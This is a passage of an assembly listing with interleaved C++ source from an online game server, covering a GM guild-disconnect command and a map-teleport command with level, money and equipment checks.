	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01729	83 c4 14	 add	 esp, 20			; 00000014H

; 2276 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Guild Disconnect");
; 2277 : 	#endif
; 2278 : 
; 2279 : 		pId = GetTokenString();

  0172c	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0172f	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01734	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2280 : 		if( pId == NULL ) return 0;

  0173a	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01741	75 07		 jne	 SHORT $LN136@Management
  01743	33 c0		 xor	 eax, eax
  01745	e9 74 25 00 00	 jmp	 $LN1@Management
$LN136@Management:

; 2281 : 		{
; 2282 : 			LPGUILD_INFO lpNode = Guild.SearchGuild(pId);

  0174a	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01750	50		 push	 eax
  01751	b9 00 00 00 00	 mov	 ecx, OFFSET ?Guild@@3VCGuildClass@@A ; Guild
  01756	e8 00 00 00 00	 call	 ?SearchGuild@CGuildClass@@QAEPAU_GUILD_INFO_STRUCT@@PAD@Z ; CGuildClass::SearchGuild
  0175b	89 85 40 fb ff
	ff		 mov	 DWORD PTR _lpNode$96[ebp], eax

; 2283 : 			if( lpNode != NULL )

  01761	83 bd 40 fb ff
	ff 00		 cmp	 DWORD PTR _lpNode$96[ebp], 0
  01768	0f 84 94 00 00
	00		 je	 $LN38@Management

; 2284 : 			{
; 2285 : 				int g_index;
; 2286 : 				for( int n=0; n<MAX_GUILD; n++)

  0176e	c7 85 38 fb ff
	ff 00 00 00 00	 mov	 DWORD PTR _n$94[ebp], 0
  01778	eb 0f		 jmp	 SHORT $LN39@Management
$LN37@Management:
  0177a	8b 85 38 fb ff
	ff		 mov	 eax, DWORD PTR _n$94[ebp]
  01780	83 c0 01	 add	 eax, 1
  01783	89 85 38 fb ff
	ff		 mov	 DWORD PTR _n$94[ebp], eax
$LN39@Management:
  01789	83 bd 38 fb ff
	ff 50		 cmp	 DWORD PTR _n$94[ebp], 80 ; 00000050H
  01790	7d 70		 jge	 SHORT $LN38@Management

; 2287 : 				{				
; 2288 : 					if( lpNode->Index[n] >= 0 )

  01792	8b 85 38 fb ff
	ff		 mov	 eax, DWORD PTR _n$94[ebp]
  01798	8b 8d 40 fb ff
	ff		 mov	 ecx, DWORD PTR _lpNode$96[ebp]
  0179e	0f bf 94 41 a0
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax*2+928]
  017a6	85 d2		 test	 edx, edx
  017a8	7c 53		 jl	 SHORT $LN139@Management

; 2289 : 					{
; 2290 : 						g_index = lpNode->Index[n];

  017aa	8b 85 38 fb ff
	ff		 mov	 eax, DWORD PTR _n$94[ebp]
  017b0	8b 8d 40 fb ff
	ff		 mov	 ecx, DWORD PTR _lpNode$96[ebp]
  017b6	0f bf 94 41 a0
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax*2+928]
  017be	89 95 3c fb ff
	ff		 mov	 DWORD PTR _g_index$95[ebp], edx

; 2291 : 						if( g_index >= 0 )

  017c4	83 bd 3c fb ff
	ff 00		 cmp	 DWORD PTR _g_index$95[ebp], 0
  017cb	7c 30		 jl	 SHORT $LN139@Management

; 2292 : 						{
; 2293 : 							LogAdd(lMsg.Get(447),pId);

  017cd	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  017d3	50		 push	 eax
  017d4	68 bf 01 00 00	 push	 447			; 000001bfH
  017d9	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  017de	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  017e4	50		 push	 eax
  017e5	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAdd@@3P6AXPADZZA ; LogAdd
  017eb	83 c4 08	 add	 esp, 8

; 2294 : 							CloseClient ( g_index );

  017ee	8b 85 3c fb ff
	ff		 mov	 eax, DWORD PTR _g_index$95[ebp]
  017f4	50		 push	 eax
  017f5	e8 00 00 00 00	 call	 ?CloseClient@@YAXH@Z	; CloseClient
  017fa	83 c4 04	 add	 esp, 4
$LN139@Management:

; 2295 : 						}
; 2296 : 					}
; 2297 : 				}

  017fd	e9 78 ff ff ff	 jmp	 $LN37@Management
$LN38@Management:

; 2298 : 			}
; 2299 : 		}
; 2300 : 		break;

  01802	e9 b5 24 00 00	 jmp	 $LN2@Management
$LN140@Management:

; 2301 : 	//------------------------------------------------------------------------
; 2302 : 	//   
; 2303 : 	case GMCMD_SETPOSITION : 	
; 2304 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_SETPOSITION) == AUTHORITY_CODE_SETPOSITION) 
; 2305 : 		{
; 2306 : 			pId = GetTokenString();

  01807	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0180a	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0180f	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2307 : 			if( pId != NULL )

  01815	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  0181c	0f 84 7f 01 00
	00		 je	 $LN148@Management

; 2308 : 			{
; 2309 : 				int m_number=-1, overLevel=0, subMoney=0;

  01822	c7 85 34 fb ff
	ff ff ff ff ff	 mov	 DWORD PTR _m_number$93[ebp], -1
  0182c	c7 85 30 fb ff
	ff 00 00 00 00	 mov	 DWORD PTR _overLevel$92[ebp], 0
  01836	c7 85 2c fb ff
	ff 00 00 00 00	 mov	 DWORD PTR _subMoney$91[ebp], 0

; 2310 : 				if( lpObj->Teleport ) 

  01840	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01843	0f be 88 fc 01
	00 00		 movsx	 ecx, BYTE PTR [eax+508]
  0184a	85 c9		 test	 ecx, ecx
  0184c	74 28		 je	 SHORT $LN142@Management

; 2311 : 				{
; 2312 : 					GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);	// 

  0184e	6a 01		 push	 1
  01850	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01853	8b 08		 mov	 ecx, DWORD PTR [eax]
  01855	51		 push	 ecx
  01856	68 44 06 00 00	 push	 1604			; 00000644H
  0185b	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  01860	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  01866	50		 push	 eax
  01867	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0186c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2313 : 					//GCServerMsgStringSend("  ", aIndex, 1);
; 2314 : 					return 0;

  0186f	33 c0		 xor	 eax, eax
  01871	e9 48 24 00 00	 jmp	 $LN1@Management
$LN142@Management:

; 2315 : 				}
; 2316 : 
; 2317 : 				if( lpObj->m_IfState.use ) 

  01876	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01879	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  0187f	80 e1 03	 and	 cl, 3
  01882	0f b6 d1	 movzx	 edx, cl
  01885	85 d2		 test	 edx, edx
  01887	74 4e		 je	 SHORT $LN144@Management

; 2318 : 				{
; 2319 : 					if( lpObj->m_IfState.type == I_SHOP )	//  ..

  01889	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0188c	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  01892	c0 e9 04	 shr	 cl, 4
  01895	80 e1 0f	 and	 cl, 15			; 0000000fH
  01898	0f b6 d1	 movzx	 edx, cl
  0189b	83 fa 03	 cmp	 edx, 3
  0189e	75 37		 jne	 SHORT $LN144@Management

; 2320 : 					{
; 2321 : 						lpObj->TargetShopNumber = -1;	//  .

  018a0	83 c8 ff	 or	 eax, -1
  018a3	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  018a6	66 89 81 ae 02
	00 00		 mov	 WORD PTR [ecx+686], ax

; 2322 : 						lpObj->m_IfState.type   = 0;

  018ad	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  018b0	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  018b6	80 e1 0f	 and	 cl, 15			; 0000000fH
  018b9	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  018bc	88 8a 56 0c 00
	00		 mov	 BYTE PTR [edx+3158], cl

; 2323 : 						lpObj->m_IfState.use    = 0;

  018c2	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  018c5	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  018cb	80 e1 fc	 and	 cl, 252			; 000000fcH
  018ce	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  018d1	88 8a 56 0c 00
	00		 mov	 BYTE PTR [edx+3158], cl
$LN144@Management:

; 2324 : 					}
; 2325 : 				}
; 2326 : 				//         .
; 2327 : 				if( lpObj->m_IfState.use > 0 )

  018d7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  018da	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  018e0	80 e1 03	 and	 cl, 3
  018e3	0f b6 d1	 movzx	 edx, cl
  018e6	85 d2		 test	 edx, edx
  018e8	7e 28		 jle	 SHORT $LN145@Management

; 2328 : 				{
; 2329 : 					GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);	// 

  018ea	6a 01		 push	 1
  018ec	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  018ef	8b 08		 mov	 ecx, DWORD PTR [eax]
  018f1	51		 push	 ecx
  018f2	68 44 06 00 00	 push	 1604			; 00000644H
  018f7	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  018fc	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  01902	50		 push	 eax
  01903	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  01908	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2330 : 					return 0;

  0190b	33 c0		 xor	 eax, eax
  0190d	e9 ac 23 00 00	 jmp	 $LN1@Management
$LN145@Management:

; 2331 : 				}
; 2332 : 
; 2333 : 				if( gObj[aIndex].IsInBattleGround )

  01912	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01919	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0191f	0f b6 94 01 7a
	0e 00 00	 movzx	 edx, BYTE PTR [ecx+eax+3706]
  01927	85 d2		 test	 edx, edx
  01929	74 28		 je	 SHORT $LN146@Management

; 2334 : 				{
; 2335 : 					GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);	// 

  0192b	6a 01		 push	 1
  0192d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01930	8b 08		 mov	 ecx, DWORD PTR [eax]
  01932	51		 push	 ecx
  01933	68 44 06 00 00	 push	 1604			; 00000644H
  01938	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  0193d	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  01943	50		 push	 eax
  01944	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  01949	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2336 : 					return 0;

  0194c	33 c0		 xor	 eax, eax
  0194e	e9 6b 23 00 00	 jmp	 $LN1@Management
$LN146@Management:

; 2337 : 				}
; 2338 : 				
; 2339 : #ifdef UPDATE_PK_SYSTEM_20070302		//  2   
; 2340 : 				BOOL	PKFlag = FALSE;
; 2341 : 				if(gObj[aIndex].PartyNumber >= 0)	//  
; 2342 : 				{
; 2343 : 					if( gParty.GetPKPartyPenalty(gObj[aIndex].PartyNumber) >= PK_LEVEL_DEFAULT+2)
; 2344 : 					{
; 2345 : 						PKFlag = TRUE;
; 2346 : 					}
; 2347 : 				}
; 2348 : 				else
; 2349 : 				{
; 2350 : 					if(gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT+2)
; 2351 : 					{
; 2352 : 						PKFlag = TRUE;
; 2353 : 					}
; 2354 : 				}
; 2355 : 
; 2356 : 				if(PKFlag == TRUE)
; 2357 : #else	// UPDATE_PK_SYSTEM_20070302
; 2358 : 
; 2359 : 				if( lpObj->m_PK_Level >= 6 

  01953	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01956	0f be 88 fd 00
	00 00		 movsx	 ecx, BYTE PTR [eax+253]
  0195d	83 f9 06	 cmp	 ecx, 6
  01960	7c 2a		 jl	 SHORT $LN147@Management

; 2360 : //#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324				//   
; 2361 : //					&& !gPkLimitFree
; 2362 : //#endif
; 2363 : 					)
; 2364 : #endif	// UPDATE_PK_SYSTEM_20070302
; 2365 : 				{
; 2366 : 					//  					
; 2367 : 					//ChatTargetSend(, lMsg.Get(1125), lpObj->m_Index);
; 2368 : 					GCServerMsgStringSend(lMsg.Get(1125), lpObj->m_Index, 1);

  01962	6a 01		 push	 1
  01964	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01967	8b 08		 mov	 ecx, DWORD PTR [eax]
  01969	51		 push	 ecx
  0196a	68 65 04 00 00	 push	 1125			; 00000465H
  0196f	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  01974	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  0197a	50		 push	 eax
  0197b	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  01980	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2369 : 					return 0;

  01983	33 c0		 xor	 eax, eax
  01985	e9 34 23 00 00	 jmp	 $LN1@Management

; 2370 : 				}

  0198a	eb 15		 jmp	 SHORT $LN148@Management
$LN147@Management:

; 2371 : 				else
; 2372 : 				{
; 2373 : 	#ifdef ADD_MOVE_COMMAND_SCRIPT
; 2374 : 		#ifndef ADD_MAPMOVE_PROTOCOL_20090327			// !! NOT
; 2375 : 					gMoveCommand.Move(lpObj, pId);

  0198c	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01992	50		 push	 eax
  01993	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01996	51		 push	 ecx
  01997	b9 00 00 00 00	 mov	 ecx, OFFSET ?gMoveCommand@@3VCMoveCommand@@A ; gMoveCommand
  0199c	e8 00 00 00 00	 call	 ?Move@CMoveCommand@@QAEHPAVOBJECTSTRUCT@@PAD@Z ; CMoveCommand::Move
$LN148@Management:

; 2376 : 		#endif // ADD_MAPMOVE_PROTOCOL_20090327
; 2377 : 	#else
; 2378 : 					
; 2379 : 					m_number   = -1;
; 2380 : 					overLevel  = 0;
; 2381 : 					subMoney   = 2000;
; 2382 : 
; 2383 : 					if( strcmp(pId, lMsg.Get(2000)) == 0 || 
; 2384 : 						_stricmp(pId, lMsg.Get(2020)) == 0)	// 
; 2385 : 					{
; 2386 : 						m_number = 17;
; 2387 : 						overLevel = GetMapMoveLevel(lpObj, 0, 50);
; 2388 : 
; 2389 : 					}
; 2390 : 					else if( strcmp(pId, lMsg.Get(2001)) == 0 || 
; 2391 : 							 _stricmp(pId, lMsg.Get(2021)) == 0 )	// 
; 2392 : 					{
; 2393 : 						m_number = 6;
; 2394 : 						overLevel = GetMapMoveLevel(lpObj, 1, 50);
; 2395 : 					}
; 2396 : 					else if( strcmp(pId, lMsg.Get(2010)) == 0 || 
; 2397 : 							 _stricmp(pId, lMsg.Get(2010)) == 0 )	// 3
; 2398 : 					{
; 2399 : 						m_number = 10;
; 2400 : 						subMoney = 3000;
; 2401 : 						overLevel = GetMapMoveLevel(lpObj, 1, 60);
; 2402 : 					}
; 2403 : 					else if( strcmp(pId, lMsg.Get(2002)) == 0 || 
; 2404 : 							 _stricmp(pId, lMsg.Get(2022)) == 0 )	// 
; 2405 : 					{
; 2406 : 						m_number = 22;
; 2407 : 						overLevel = GetMapMoveLevel(lpObj, 2, 50);
; 2408 : 					}
; 2409 : 					else if( strcmp(pId, lMsg.Get(2003)) == 0 || 
; 2410 : 							 _stricmp(pId, lMsg.Get(2023)) == 0 )	// 
; 2411 : 					{
; 2412 : 						m_number = 27;
; 2413 : 						overLevel = GetMapMoveLevel(lpObj, 3, 50);
; 2414 : 					}
; 2415 : 					else if( strcmp(pId, lMsg.Get(2004)) == 0 || 
; 2416 : 							 _stricmp(pId, lMsg.Get(2024)) == 0 ) // 
; 2417 : 					{
; 2418 : 						m_number = 42;
; 2419 : 						subMoney = 5000;
; 2420 : 
; 2421 : 						overLevel = GetMapMoveLevel(lpObj, 4, 90);
; 2422 : 					}
; 2423 : 					else if( strcmp(pId, lMsg.Get(2007)) == 0 || 
; 2424 : 						     _stricmp(pId, lMsg.Get(2027)) == 0 )	// 3 
; 2425 : 					{
; 2426 : 						m_number = 33;
; 2427 : 						subMoney = 5000;
; 2428 : 
; 2429 : 						overLevel = GetMapMoveLevel(lpObj, 4, 100);
; 2430 : 					}
; 2431 : 					else if( strcmp(pId, lMsg.Get(2011)) == 0 || 
; 2432 : 						     _stricmp(pId, lMsg.Get(2031)) == 0 )	// 5 
; 2433 : 					{
; 2434 : 						m_number = 37;
; 2435 : 						subMoney = 5000;
; 2436 : 
; 2437 : 						overLevel = GetMapMoveLevel(lpObj, 4, 110);
; 2438 : 					}
; 2439 : 					else if( strcmp(pId, lMsg.Get(2012)) == 0 || 
; 2440 : 						     _stricmp(pId, lMsg.Get(2032)) == 0 )	// 7 
; 2441 : 					{
; 2442 : 						m_number = 41;
; 2443 : 						subMoney = 8000;
; 2444 : 
; 2445 : 						overLevel = GetMapMoveLevel(lpObj, 4, 120);
; 2446 : 					}
; 2447 : 					else if( strcmp(pId, lMsg.Get(2006)) == 0 || 
; 2448 : 						     _stricmp(pId, lMsg.Get(2026)) == 0 )	// 
; 2449 : 					{
; 2450 : 						m_number = 50;
; 2451 : 						overLevel = GetMapMoveLevel(lpObj, 6, 50);
; 2452 : 
; 2453 : #ifdef FOR_ONAIR	//    
; 2454 : 						gObjTeleport(lpObj->m_Index, 6, 60+rand()%10, 153+rand()%6);
; 2455 : #endif
; 2456 : 
; 2457 : 					}
; 2458 : 					else if( strcmp(pId, lMsg.Get(2005)) == 0 || 
; 2459 : 							 _stricmp(pId, lMsg.Get(2025)) == 0 )	//  
; 2460 : 					{
; 2461 : 						m_number = 49;
; 2462 : 						subMoney = 5000;
; 2463 : 
; 2464 : 						overLevel = GetMapMoveLevel(lpObj, 7, 70);
; 2465 : 						
; 2466 : 						//       .
; 2467 : 						if( lpObj->pInventory[EQUIPMENT_HELPER].IsItem())
; 2468 : 						{							
; 2469 : 							if( lpObj->pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,2) )
; 2470 : 							{
; 2471 : 								GCServerMsgStringSend(lMsg.Get(702), lpObj->m_Index, 1);
; 2472 : 								return 0;
; 2473 : 							}
; 2474 : 						}
; 2475 : 
; 2476 : 					}
; 2477 :  					else if( strcmp(pId, lMsg.Get(2008)) == 0 || 
; 2478 : 							 _stricmp(pId, lMsg.Get(2028)) == 0 )	// 
; 2479 : 					{
; 2480 : 						m_number = 57;
; 2481 : 						subMoney = 5000;
; 2482 : 
; 2483 : 						overLevel = GetMapMoveLevel(lpObj, 8, 140);
; 2484 : 					}
; 2485 : 					else if( strcmp(pId, lMsg.Get(2013)) == 0 || 
; 2486 : 							 _stricmp(pId, lMsg.Get(2033)) == 0 )	// 
; 2487 : 					{
; 2488 : 						m_number = 62;
; 2489 : 						subMoney = 15000;
; 2490 : 						overLevel = GetMapMoveLevel(lpObj, 8, 170);
; 2491 : 						
; 2492 : 						if( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM(13,3) && 
; 2493 : 							( lpObj->pInventory[EQUIPMENT_WING].m_Type < MAKE_ITEMNUM(12,0) || 
; 2494 : 							  lpObj->pInventory[EQUIPMENT_WING].m_Type > MAKE_ITEMNUM(12,6) ) )
; 2495 : 						{
; 2496 : 							GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);
; 2497 : 							return 0;
; 2498 : 						}
; 2499 : 
; 2500 : 						if( lpObj->pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,2) )
; 2501 : 						{	//    
; 2502 : 							GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);
; 2503 : 							return 0;
; 2504 : 						}
; 2505 : 
; 2506 : 						if( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM(13,10) || 
; 2507 : 							lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM(13,10) )
; 2508 : 						{	//    
; 2509 : 							GCServerMsgStringSend(lMsg.Get(1604), lpObj->m_Index, 1);
; 2510 : 							return 0;
; 2511 : 						}
; 2512 : 					}
; 2513 : 					
; 2514 : #if (TESTSERVER == 1) || defined(FOR_TEMP_SERVER)
; 2515 : #ifdef FOR_BLOODCASTLE
; 2516 : 					else if( strcmp(pId, "1") == 0 )			// 1
; 2517 : 					{
; 2518 : 						m_number = 66;
; 2519 : 						subMoney = 0;
; 2520 : 
; 2521 : 						lpObj->m_cBloodCastleIndex = 0;
; 2522 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2523 : 						lpObj->m_iBloodCastleEXP = 0;
; 2524 : 
; 2525 : 						overLevel = GetMapMoveLevel(lpObj, 11, 0);
; 2526 : 					}
; 2527 : 					else if( strcmp(pId, "2") == 0 )			// 2
; 2528 : 					{
; 2529 : 						m_number = 67;
; 2530 : 						subMoney = 0;
; 2531 : 
; 2532 : 						lpObj->m_cBloodCastleIndex = 1;
; 2533 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2534 : 						lpObj->m_iBloodCastleEXP = 0;
; 2535 : 
; 2536 : 						overLevel = GetMapMoveLevel(lpObj, 12, 0);
; 2537 : 					}
; 2538 : 					else if( strcmp(pId, "3") == 0 )			// 3
; 2539 : 					{
; 2540 : 						m_number = 68;
; 2541 : 						subMoney = 0;
; 2542 : 
; 2543 : 						lpObj->m_cBloodCastleIndex = 2;
; 2544 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2545 : 						lpObj->m_iBloodCastleEXP = 0;
; 2546 : 
; 2547 : 						overLevel = GetMapMoveLevel(lpObj, 13, 0);
; 2548 : 					}
; 2549 : 					else if( strcmp(pId, "4") == 0 )			// 4
; 2550 : 					{
; 2551 : 						m_number = 69;
; 2552 : 						subMoney = 0;
; 2553 : 
; 2554 : 						lpObj->m_cBloodCastleIndex = 3;
; 2555 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2556 : 						lpObj->m_iBloodCastleEXP = 0;
; 2557 : 
; 2558 : 						overLevel = GetMapMoveLevel(lpObj, 14, 0);
; 2559 : 					}
; 2560 : 					else if( strcmp(pId, "5") == 0 )			// 5
; 2561 : 					{
; 2562 : 						m_number = 70;
; 2563 : 						subMoney = 0;
; 2564 : 
; 2565 : 						lpObj->m_cBloodCastleIndex = 4;
; 2566 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2567 : 						lpObj->m_iBloodCastleEXP = 0;
; 2568 : 
; 2569 : 						overLevel = GetMapMoveLevel(lpObj, 15, 0);
; 2570 : 					}
; 2571 : 					else if( strcmp(pId, "6") == 0 )			// 6
; 2572 : 					{
; 2573 : 						m_number = 71;
; 2574 : 						subMoney = 0;
; 2575 : 
; 2576 : 						lpObj->m_cBloodCastleIndex = 5;
; 2577 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2578 : 						lpObj->m_iBloodCastleEXP = 0;
; 2579 : 
; 2580 : 						overLevel = GetMapMoveLevel(lpObj, 16, 0);
; 2581 : 					}
; 2582 : #ifdef BLOODCASTLE_EXTEND_20040314			//    /      
; 2583 : 					else if( strcmp(pId, "7") == 0 )			// 6
; 2584 : 					{
; 2585 : 						m_number = 80;
; 2586 : 						subMoney = 0;
; 2587 : 
; 2588 : 						lpObj->m_cBloodCastleIndex = 6;
; 2589 : 						lpObj->m_cBloodCastleSubIndex = -1;
; 2590 : 						lpObj->m_iBloodCastleEXP = 0;
; 2591 : 
; 2592 : 						overLevel = GetMapMoveLevel(lpObj, 17, 0);
; 2593 : 					}
; 2594 : #endif
; 2595 : #endif					
; 2596 : 					else if( strcmp(pId, "1") == 0 )	//  
; 2597 : 					{
; 2598 : 						m_number = 58;
; 2599 : 						subMoney = 0;
; 2600 : 
; 2601 : 						lpObj->m_nEventExp = 0;
; 2602 : 						lpObj->m_nEventScore = 0;
; 2603 : 						lpObj->m_nEventMoney = 0;
; 2604 : 						lpObj->m_bDevilSquareIndex = 0;
; 2605 : 
; 2606 : 						overLevel = GetMapMoveLevel(lpObj, 9, 20);
; 2607 : 					}
; 2608 : 					else if( strcmp(pId, "2") == 0 )	//  
; 2609 : 					{
; 2610 : 						m_number = 59;
; 2611 : 						subMoney = 0;
; 2612 : 
; 2613 : 						lpObj->m_nEventExp = 0;
; 2614 : 						lpObj->m_nEventScore = 0;
; 2615 : 						lpObj->m_nEventMoney = 0;
; 2616 : 						lpObj->m_bDevilSquareIndex = 1;
; 2617 : 
; 2618 : 						overLevel = GetMapMoveLevel(lpObj, 9, 20);
; 2619 : 					}
; 2620 : 					else if( strcmp(pId, "3") == 0 )	//  
; 2621 : 					{
; 2622 : 						m_number = 60;
; 2623 : 						subMoney = 0;
; 2624 : 
; 2625 : 						lpObj->m_nEventExp = 0;
; 2626 : 						lpObj->m_nEventScore = 0;
; 2627 : 						lpObj->m_nEventMoney = 0;
; 2628 : 						lpObj->m_bDevilSquareIndex = 2;
; 2629 : 
; 2630 : 						overLevel = GetMapMoveLevel(lpObj, 9, 20);
; 2631 : 					}
; 2632 : 					else if( strcmp(pId, "4") == 0 )	//  
; 2633 : 					{
; 2634 : 						m_number = 61;
; 2635 : 						subMoney = 0;
; 2636 : 
; 2637 : 						lpObj->m_nEventExp = 0;
; 2638 : 						lpObj->m_nEventScore = 0;
; 2639 : 						lpObj->m_nEventMoney = 0;
; 2640 : 						lpObj->m_bDevilSquareIndex = 3;
; 2641 : 
; 2642 : 						overLevel = GetMapMoveLevel(lpObj, 9, 20);
; 2643 : 					}				
; 2644 : #ifdef DEVILSQUARE_EXTEND_20050221
; 2645 : 					else if( strcmp(pId, "5") == 0 )	//  
; 2646 : 					{
; 2647 : 						m_number = 111;
; 2648 : 						subMoney = 0;
; 2649 : 
; 2650 : 						lpObj->m_nEventExp = 0;
; 2651 : 						lpObj->m_nEventScore = 0;
; 2652 : 						lpObj->m_nEventMoney = 0;
; 2653 : 						lpObj->m_bDevilSquareIndex = 4;
; 2654 : 
; 2655 : 						overLevel = GetMapMoveLevel(lpObj, 32, 20);
; 2656 : 					}
; 2657 : 					else if( strcmp(pId, "6") == 0 )	//  
; 2658 : 					{
; 2659 : 						m_number = 112;
; 2660 : 						subMoney = 0;
; 2661 : 
; 2662 : 						lpObj->m_nEventExp = 0;
; 2663 : 						lpObj->m_nEventScore = 0;
; 2664 : 						lpObj->m_nEventMoney = 0;
; 2665 : 						lpObj->m_bDevilSquareIndex = 5;
; 2666 : 
; 2667 : 						overLevel = GetMapMoveLevel(lpObj, 32, 20);
; 2668 : 					}
; 2669 : #endif				
; 2670 : #endif
; 2671 : 
; 2672 : 					//    
; 2673 : 
; 2674 : 
; 2675 : #ifdef FOR_ONAIR
; 2676 : 					subMoney = 0;
; 2677 : #endif
; 2678 : #if (TESTSERVER == 1) || defined(FOR_TEMP_SERVER)
; 2679 : 					subMoney = 0;
; 2680 : #endif
; 2681 : 					if( m_number >= 0 )
; 2682 : 					{
; 2683 : 						if( overLevel <= lpObj->Level )
; 2684 : 						{							
; 2685 : 							if( lpObj->Money-subMoney >= 0 ) 
; 2686 : 							{
; 2687 : 								if( gObjMoveGate(lpObj->m_Index, m_number) )
; 2688 : 								{
; 2689 : 									lpObj->Money -= subMoney;
; 2690 : 									LogAddTD("[%s][%s] Instant move command reduces money %d - %d [%d]", 
; 2691 : 										    lpObj->AccountID, lpObj->Name, lpObj->Money, subMoney,
; 2692 : 											lpObj->MapNumber); //"[%s][%s]      %d - %d"
; 2693 : 									GCMoneySend(lpObj->m_Index, lpObj->Money);
; 2694 : 								}
; 2695 : 								else
; 2696 : 								{
; 2697 : 									LogAddTD("[%s][%s] Instant move command fail m_number = %d", lpObj->AccountID, lpObj->Name, m_number); //"[%s][%s]   
; 2698 : 								}
; 2699 : 							}
; 2700 : 							else
; 2701 : 							{
; 2702 : 								GCServerMsgStringSend(lMsg.Get(1126), lpObj->m_Index, 1);
; 2703 : 							}
; 2704 : 						}
; 2705 : 						else 
; 2706 : 						{
; 2707 : 							char szTemp[256];
; 2708 : 							wsprintf(szTemp, lMsg.Get(1117), overLevel);
; 2709 : 							GCServerMsgStringSend(szTemp, lpObj->m_Index, 1);
; 2710 : 							return 0;
; 2711 : 						}
